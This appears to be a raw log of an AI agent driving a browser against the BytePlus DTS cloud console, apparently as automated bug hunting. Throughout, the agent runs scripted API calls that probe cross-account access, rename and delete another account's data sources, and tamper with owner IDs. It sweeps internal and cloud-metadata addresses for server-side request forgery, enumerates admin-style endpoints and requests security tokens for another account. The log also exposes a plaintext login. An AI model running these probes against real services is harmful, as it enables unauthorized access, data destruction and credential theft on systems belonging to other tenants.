fetch('/api/top/dts/CreateValidationTask/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n    out.push({ss,resp:await r.text()});\n  }\n  return out;\n}","waitForStableDom":false}
+4174:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const vers=['2018-01-01','2019-01-01','2020-01-01','2021-01-01','2021-10-01','2022-01-01','2022-10-01'];\n  const out=[];\n  for(const ver of vers){\n    for(const a of ['DeleteDataSource','ModifyDataSource','CreateDataSource']){\n      const body=a==='ModifyDataSource'?{DataSourceId:'0',DataSource:{Name:'x'}}:a==='CreateDataSource'?{DataSource:{EndpointType:'Public_MySQL',PublicMySQLSettings:{Host:'192.0.2.1',Port:3306,Username:'x',Password:'x'},Category:'MySQL',Name:'x'}}:{DataSourceId:'0'};\n      const r=await fetch(`/api/top/dts/${a}/${ver}/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n      const t=await r.text(); const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';\n      out.push({a,ver,code});\n    }\n  }\n  return out;\n}","waitForStableDom":false}
+4176:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const d=await fetch('/api/top/dts/DeleteDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSourceId:'2115010358560165896'})});\n  const dt=await d.text();\n  const l=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({PageNum:1,PageSize:50})});\n  return {delete:dt,list:await l.text()};\n}","waitForStableDom":false}
+4177:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const hosts=['[::ffff:127.0.0.1]','::ffff:127.0.0.1','[::ffff:169.254.169.254]','100.96.0.96','100.100.100.200','198.18.0.1','240.0.0.1','255.255.255.255'];\n  const out=[];\n  for(const host of hosts){\n    const ds={EndpointType:'Public_MySQL',PublicMySQLSettings:{RegionSettings:{Region:'ap-southeast-1'},Host:host,Port:3306,Username:'x',Password:'x',SSLSettings:{EnableSSL:false}},Category:'MySQL',Name:'x'};\n    const ctl=new AbortController(); const to=setTimeout(()=>ctl.abort(),5000); const t0=Date.now();\n    try{\n      const r=await fetch('/api/top/dts/CheckDataSourceConnection/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSource:ds,AsyncCheck:false}),signal:ctl.signal});\n      const t=await r.text(); const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';\n      out.push({host,ms:Date.now()-t0,code});\n    }catch(e){out.push({host,ms:Date.now()-t0,code:'ABORT/'+e.name})}finally{clearTimeout(to)}\n  }\n  return out;\n}","waitForStableDom":false}
+4568:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const mk=(id,name)=>({DataSourceId:id,Category:'MySQL',EndpointType:'Public_MySQL',Name:name,PublicMySQLSettings:{Host:'192.0.2.1',Port:3306,Username:'aaitest',Password:'aaitestpass',RegionSettings:{Region:'ap-southeast-1'}}});\n  const src=mk('2116046640132395013','aaitest-ds-b-renamed');\n  const dst=mk('2115010358560165895','aaitest-ma-b-20261030');\n  const body={SrcConfig:src,DestConfig:dst,SolutionSettings:{},TaskType:'DataValidation',IdempotencyKey:(crypto.randomUUID?crypto.randomUUID():String(Date.now()))};\n  const r=await fetch('/api/top/dts/CreateValidationTask/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n  const t=await r.text();\n  return {status:r.status,body:body,resp:t};\n}","waitForStableDom":false}
+4569:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const mk=(id,name)=>({DataSourceId:id,Category:'MySQL',EndpointType:'Public_MySQL',Name:name,PublicMySQLSettings:{Host:'192.0.2.1',Port:3306,Username:'aaitest',Password:'aaitestpass',RegionSettings:{Region:'ap-southeast-1'}}});\n  const src=mk('2116046640132395013','aaitest-ds-b-renamed');\n  const dst=mk('2115010358560165895','aaitest-ma-b-20261030');\n  const variants=[\n    {SolutionSettings:{MySQL2MySQLSettings:{}}},\n    {SolutionSettings:{SolutionType:'MySQL2MySQL',MySQL2MySQLSettings:{}}},\n    {SolutionSettings:{MySQL2MySQL:{}}},\n  ];\n  const out=[];\n  for(const v of variants){\n    const body={SrcConfig:src,DestConfig:dst,...v,TaskType:'DataValidation',IdempotencyKey:(crypto.randomUUID?crypto.randomUUID():String(Date.now()))};\n    const r=await fetch('/api/top/dts/CreateValidationTask/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n    out.push({variant:Object.keys(v),resp:await r.text()});\n  }\n  return out;\n}","waitForStableDom":false}
+4570:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const mk=(id,name)=>({DataSourceId:id,Category:'MySQL',EndpointType:'Public_MySQL',Name:name,PublicMySQLSettings:{Host:'192.0.2.1',Port:3306,Username:'aaitest',Password:'aaitestpass',RegionSettings:{Region:'ap-southeast-1'}}});\n  const src=mk('2116046640132395013','aaitest-ds-b-renamed');\n  const dst=mk('2115010358560165895','aaitest-ma-b-20261030');\n  const variants=[\n    [{MySQL2MySQLSettings:{ObjectMappings:[]}}],\n    [{MySQL2MySQLSettings:{},ObjectMappings:[]}],\n    [{MySQL2MySQLSettings:{ObjectMappings:[{SrcObjName:'aaitest',DestObjName:'aaitest',ObjectType:'Table'}]}}],\n  ];\n  const out=[];\n  for(const [ss] of variants){\n    const body={SrcConfig:src,DestConfig:dst,SolutionSettings:ss,TaskType:'DataValidation',IdempotencyKey:(crypto.randomUUID?crypto.randomUUID():String(Date.now()))};\n    const r=await fetch('/api/top/dts/CreateValidationTask/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n    out.push({ss,resp:await r.text()});\n  }\n  return out;\n}","waitForStableDom":false}
+4574:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const vers=['2018-01-01','2019-01-01','2020-01-01','2021-01-01','2021-10-01','2022-01-01','2022-10-01'];\n  const out=[];\n  for(const ver of vers){\n    for(const a of ['DeleteDataSource','ModifyDataSource','CreateDataSource']){\n      const body=a==='ModifyDataSource'?{DataSourceId:'0',DataSource:{Name:'x'}}:a==='CreateDataSource'?{DataSource:{EndpointType:'Public_MySQL',PublicMySQLSettings:{Host:'192.0.2.1',Port:3306,Username:'x',Password:'x'},Category:'MySQL',Name:'x'}}:{DataSourceId:'0'};\n      const r=await fetch(`/api/top/dts/${a}/${ver}/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n      const t=await r.text(); const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';\n      out.push({a,ver,code});\n    }\n  }\n  return out;\n}","waitForStableDom":false}
+4576:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const d=await fetch('/api/top/dts/DeleteDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSourceId:'2115010358560165896'})});\n  const dt=await d.text();\n  const l=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({PageNum:1,PageSize:50})});\n  return {delete:dt,list:await l.text()};\n}","waitForStableDom":false}
+4577:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const hosts=['[::ffff:127.0.0.1]','::ffff:127.0.0.1','[::ffff:169.254.169.254]','100.96.0.96','100.100.100.200','198.18.0.1','240.0.0.1','255.255.255.255'];\n  const out=[];\n  for(const host of hosts){\n    const ds={EndpointType:'Public_MySQL',PublicMySQLSettings:{RegionSettings:{Region:'ap-southeast-1'},Host:host,Port:3306,Username:'x',Password:'x',SSLSettings:{EnableSSL:false}},Category:'MySQL',Name:'x'};\n    const ctl=new AbortController(); const to=setTimeout(()=>ctl.abort(),5000); const t0=Date.now();\n    try{\n      const r=await fetch('/api/top/dts/CheckDataSourceConnection/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSource:ds,AsyncCheck:false}),signal:ctl.signal});\n      const t=await r.text(); const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';\n      out.push({host,ms:Date.now()-t0,code});\n    }catch(e){out.push({host,ms:Date.now()-t0,code:'ABORT/'+e.name})}finally{clearTimeout(to)}\n  }\n  return out;\n}","waitForStableDom":false}
+4982:4176:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const d=await fetch('/api/top/dts/DeleteDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSourceId:'2115010358560165896'})});\n  const dt=await d.text();\n  const l=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({PageNum:1,PageSize:50})});\n  return {delete:dt,list:await l.text()};\n}","waitForStableDom":false}
+5000:4576:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const d=await fetch('/api/top/dts/DeleteDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSourceId:'2115010358560165896'})});\n  const dt=await d.text();\n  const l=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({PageNum:1,PageSize:50})});\n  return {delete:dt,list:await l.text()};\n}","waitForStableDom":false}
+[0m
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const ds={Category:'MySQL',EndpointType:'Public_MySQL',Name:'aaitest-a-20261030',PublicMySQLSettings:{Host:'192.0.2.1',Port:3306,Username:'aaitest',Password:'aaitestpass',RegionSettings:{Region:'ap-southeast-1'}}};\n  const r=await fetch('/api/top/dts/CreateDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({DataSource:ds})});\n  const t=await r.text();\n  const l=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({PageNum:1,PageSize:50})});\n  return {create:{status:r.status,txt:t.slice(0,1500)},list:(await l.text()).slice(0,1500)};\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const call=async(a,body)=>{const r=await fetch(`/api/top/dts/${a}/2022-10-01/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});return {status:r.status,txt:(await r.text()).slice(0,1200)};};\n  const out={};\n  out.modify1=await call('ModifyDataSource',{DataSourceId:'2116046640132395013',DataSource:{Name:'aaitest-idor-A-probe-20261030'}});\n  out.modify2=await call('ModifyDataSource',{DataSourceId:'2116046640132395013',Name:'aaitest-idor-A-probe-20261030'});\n  out.del=await call('DeleteDataSource',{DataSourceId:'2116046640132395013'});\n  return out;\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => { const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)}); const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'}; const r=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify({PageNum:1,PageSize:50})}); return (await r.text()).slice(0,1200); }","waitForStableDom":false}
+[0m
+[0m← [0mWrite result/server-side/notes.md
+Wrote file successfully.
+[0m
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"() => { const names=document.cookie.split('; ').map(x=>x.split('=')[0]); const doms=['','; domain=.byteplus.com','; domain=.console.byteplus.com','; domain=console.byteplus.com']; names.forEach(n=>doms.forEach(d=>{document.cookie=n+'=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/'+d;})); return names; }","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_navigate_page {"pageId":1,"type":"url","url":"https://signin.byteplus.com/auth/login?redirectURI=https%3A%2F%2Fconsole.byteplus.com%2Fdts%2Fregion%3Adts%2Bap-southeast-1%2F","timeout":45000}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"() => { const names=document.cookie.split('; ').map(x=>x.split('=')[0]); const doms=['','; domain=.byteplus.com','; domain=.signin.byteplus.com','; domain=signin.byteplus.com']; names.forEach(n=>doms.forEach(d=>{document.cookie=n+'=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/'+d;})); return {names,url:location.href}; }","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_new_page {"url":"https://signin.byteplus.com/auth/login?redirectURI=https%3A%2F%2Fconsole.byteplus.com%2Fdts%2Fregion%3Adts%2Bap-southeast-1%2F","isolatedContext":"acctB","timeout":45000}
+[0m⚙ [0mchrome-devtools_take_snapshot {"pageId":2}
+[0m⚙ [0mchrome-devtools_click {"pageId":2,"uid":"4_33"}
+[0m⚙ [0mchrome-devtools_fill_form {"pageId":2,"elements":[{"uid":"4_7","value":"testt456"},{"uid":"4_8","value":"Acd3423@#345"}]}
+[0m⚙ [0mchrome-devtools_click {"pageId":2,"uid":"4_14"}
+[0m✗ [0mchrome-devtools_wait_for {"pageId":2,"text":["Database Transmission Service","DTS","incorrect","Invalid","Verification"],"timeout":20000} failed
+[91m[1mError: [0mTimed out after waiting 20000ms
+[0m⚙ [0mchrome-devtools_take_snapshot {"pageId":2}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const call=async(a,body)=>{const r=await fetch(`/api/top/dts/${a}/2022-10-01/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});return (await r.text()).slice(0,1500);};\n  return {account:c.AccountID, list:await call('ListDataSource',{PageNum:1,PageSize:50}), ds1:await call('DescribeDataSource',{DataSourceId:'2116046640132395013'}), ds2:await call('DescribeDataSource',{DataSourceId:'2115010358560165895'}), a:await call('DescribeDataSource',{DataSourceId:'2115010182613307397'})};\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const ds={Category:'MySQL',EndpointType:'Public_MySQL',Name:'aaitest-a-renamed',PublicMySQLSettings:{Host:'192.0.2.1',Port:3306,Username:'aaitest',Password:'aaitestpass',RegionSettings:{Region:'ap-southeast-1'}}};\n  const call=async(a,body)=>{const r=await fetch(`/api/top/dts/${a}/2022-10-01/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});return {status:r.status,txt:(await r.text()).slice(0,1000)};};\n  const out={};\n  out.mod={DataSourceId:'2115010182613307397',DataSource:ds};\n  out.modResp=await call('ModifyDataSource',out.mod);\n  out.list=await call('ListDataSource',{PageNum:1,PageSize:50});\n  return out;\n}","waitForStableDom":false}
+[0m
+[0m$ [0mgrep -aoE '[A-Za-z]*Mgr[A-Za-z]*' result/logs/opencode.log | sort -u | head -50; echo '--- Inner/Admin ---'; grep -aoE '(Inner|Admin|Mgr|Operate|Set|Update)[A-Za-z]{3,40}' result/logs/opencode.log | sort -u | head -80
+ListMgrCustomerParam
+ListMgrParam
+Mgr
+MgrCustomerParam
+MgrParamInvalid
+UpdateMgrCustomerParam
+UpdateMgrParam
+--- Inner/Admin ---
+InnerByteDanceMQTenantWhiteList
+InnerListTradeInstance
+InnerOpTradeInstance
+MgrCustomerParam
+MgrParam
+MgrParamInvalid
+OperateDFlow
+OperateObject
+SetBiSyncDDLSource
+SetDFlowKV
+SetInnerHTML
+Settin
+Setting
+Settings
+UpdateAlertRemark
+UpdateAlertRuleParams
+UpdateBackwardTask
+UpdateCloudMon
+UpdateCloudMonitor
+UpdateDBFullRateLimit
+UpdateMgrCustomerParam
+UpdateMgrParam
+UpdateMonitorConfig
+UpdateMonitorRemark
+UpdateSubscriptionGro
+UpdateSubscriptionGroup
+UpdateTrafficSpec
+[0m
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const call=async(a,ver,body)=>{try{const r=await fetch(`/api/top/dts/${a}/${ver}/ap-southeast-1`,{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});const t=await r.text();const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';return {a,ver,status:r.status,code,snip:t.slice(0,400)};}catch(e){return {a,ver,err:String(e)}}};\n  const out=[];\n  for(const a of ['ListMgrParam','UpdateMgrParam','UpdateMgrCustomerParam','ListMgrCustomerParam']){\n    for(const ver of ['2018-01-01','2022-10-01']){ out.push(await call(a,ver,{})); }\n  }\n  return out;\n}","waitForStableDom":false}
+[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');if(i>0)c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const keys=['AccountId','AccountID','OwnerId','OwnerAccountId','UserId','TenantId','TenantID','FilterAccountId','ResourceOwner','Account'];\n  const out=[];\n  for(const k of keys){\n    const body={PageNum:1,PageSize:50,[k]:'3001021825'};\n    const r=await fetch('/api/top/dts/ListDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify(body)});\n    const t=await r.text(); const count=(t.match(/\"Count\":(\\d+)/)||[])[1]; const code=(t.match(/\"Code\":\"([^\"]+)\"/)||[])[1]||'OK';\n    out.push({k,code,count,cross:t.includes('2116046640132395013')||t.includes('aaitest-ds-b')});\n  }\n  return out;\n}","waitForStableDom":false}
+[0m
+[0m$ [0mgrep -aoE '.{80}AccountId.{80}' result/logs/opencode.log | sort -u | head -20
+:'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const keys=['AccountId','AccountID','OwnerId','OwnerAccountId','UserId','TenantId','TenantID','FilterA
+OfBinlogInTOS'},{Type:'SecurityTokenOfNone'},{Type:'SecurityTokenOfBinlogInTOS',AccountId:'3001021825'},{Type:'SecurityTokenOfBinlogInTOS',TenantId:'3001021825'}]){const
+SSL:false}},Category:'MySQL',Name:'aaitest-ma-b-20261030',TenantId:'3000823185',AccountId:'3000823185',Owner:'3000823185',ProjectName:'default',Tags:[{Key:'aaitest',Valu
+ap-southeast-1';\n  const bodies=[\n    {},\n    {TenantId:'3001021825'},\n    {AccountId:'3001021825'},\n    {TenantID:'3001021825'},\n    {ParamNames:['EnableMongoSubT
+e` w/ B's ID → `Result {}`; `ListDataSource` w/ `Identifier` → `Count:0`; with `AccountId`/`AccountID`/`TenantId`/`TenantID`/`TenantIDList`/`AllTenant`/`IsAdmin` → still
+ept-language':'en'};\n  const base={PageNum:1,PageSize:20};\n  const variants=[{AccountId:'3001021825'},{AccountID:'3001021825'},{TenantId:'3001021825'},{TenantID:'30010
+[0m
+[0m$ [0mgrep -an "SecurityTokenOfBinlogInTOS\|aaitest-ma-b-20261030',TenantId\|aptitude\|PENDING\|CONFIRMED\|BOLA\|IDOR\|cross" result/logs/opencode.log | tail -30
+1778:[0m⚙ [0mchrome-devtools_evaluate_script {"pageId":2,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const ds={EndpointType:'Public_MySQL',PublicMySQLSettings:{RegionSettings:{Region:'ap-southeast-1'},Host:'192.0.2.1',Port:3306,Username:'aaitest',Password:'aaitestpass',SSLSettings:{EnableSSL:false}},Category:'MySQL',Name:'aaitest-ma-b-20261030',TenantId:'3000823185',AccountId:'3000823185',Owner:'3000823185',ProjectName:'default',Tags:[{Key:'aaitest',Value:'1'}]};\n  const r=await fetch('/api/top/dts/CreateDataSource/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:{'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'},body:JSON.stringify({DataSource:ds})});\n  return {status:r.status,body:(await r.text()).slice(0,1000)};\n}","waitForStableDom":false}
+1807:- Created test-owned data source in account B (`2116046640132395013`) for cross-tenant testing.
+1810:- Cross-account BOLA/IDOR investigation on data-source endpoints.
+1822:2. Re-run `DescribeDataSource` from account A with the verified correct body; compare to B's response. If A receives B's object → confirmed cross-tenant IDOR/BOLA; then perform a benign reversible write test (rename to `aaitest-idor-modified`, revert via B) and capture evidence.
+1823:3. If IDOR confirmed, write finding under `result/server-side/` + `result/findings/`, update `result/confirmed-vuln.txt` per AGENT.md format (CI handles Discord notification), and continue mapping remaining `/dts/*` APIs.
+2752:chunks/9864.44fa83f1.js:},onProgress:e=>{const t=((null==l?void 0:l.files)||a).map((t=>t.uid===e.uid?e:t));r(t),null==n||n({files:t,uuid:i.current})},customRequest:e=>Co(undefined,null,(function*(){var t,l;const{onProgress:n,onError:a,onSuccess:r,file:o}=e,[c,s]=yield(0,Re.GetSecurityToken)({Type:Me.p9.SecurityTokenOfBinlogInTOS});if(c)return void a(c);const u=ko.ZP.CancelToken.source();new ko.ZP({region:(0,p.w9)(),accessKeyId:(null==s?void 0:s.AccessKey)||"",accessKeySecret:(null==s?void 0:s.SecretKey)||"",stsToken:(null==s?void 0:s.
+2755:chunks/1885.ac1e5208.js:ess_Milvus",e.Volc_VikingDB="Volc_VikingDB",e.Volc_AIDapPG="Volc_AIDapPG",e.Volc_Supabase="Volc_Supabase",e.Express_Supabase="Express_Supabase",e.Public_Supabase="Public_Supabase",e))(a||{}),o=(e=>(e.SecurityTokenOfNone="SecurityTokenOfNone",e.SecurityTokenOfBinlogInTOS="SecurityTokenOfBinlogInTOS",e))(o||{}),r=(e=>(e.Src="Src",e.Dest="Dest",e))(r||{}),l=(e=>(e.OrderByCreateTimeAsc="OrderByCreateTimeAsc",e.OrderByCreateTimeDesc="OrderByCreateTimeDesc",e.OrderByModifyTimeAsc="OrderByModifyTimeAsc",e.OrderByModi
+2756:chunks/9864.44fa83f1.js:));r(t),null==n||n({files:t,uuid:i.current})},customRequest:e=>Co(undefined,null,(function*(){var t,l;const{onProgress:n,onError:a,onSuccess:r,file:o}=e,[c,s]=yield(0,Re.GetSecurityToken)({Type:Me.p9.SecurityTokenOfBinlogInTOS});if(c)return void a(c);const u=ko.ZP.CancelToken.source();new ko.ZP({region:(0,p.w9)(),accessKeyId:(null==s?void 0:s.AccessKey)||"",accessKeySecret:(null==s?void 0:s.SecretKey)||"",stsToken:(null==s?void 0:s.SessionToken)||"",bucket:(null==(t=null==s?void 0:s.Info)?void 0:t.BucketName)|
+2758:[0m✗ [0mchrome-devtools_evaluate_script {"pageId":1,"function":"async () => {\n  const c={}; document.cookie.split('; ').forEach(x=>{const i=x.indexOf('=');c[x.slice(0,i)]=x.slice(i+1)});\n  const h={'content-type':'application/json; charset=UTF-8','accept':'application/json, text/plain, */*','x-csrf-token':c.csrfToken,'x-storage-request-source':'Web','x-storage-language':'en','x-dts-accept-language':'en'};\n  const out=[];\n  for (const b of [{Type:'SecurityTokenOfBinlogInTOS'},{Type:'SecurityTokenOfNone'},{Type:'SecurityTokenOfBinlogInTOS',AccountId:'3001021825'},{Type:'SecurityTokenOfBinlogInTOS',TenantId:'3001021825'}]){const r=await fetch('/api/top/dts/GetSecurityToken/2022-10-01/ap-southeast-1',{method:'POST',credentials:'include',headers:h,body:JSON.stringify(b)});const t=await r.text();out.push({b,status:r.status,snip:t.slice(0,900)});}\n  return out;\n}","waitForStableDom":false} failed
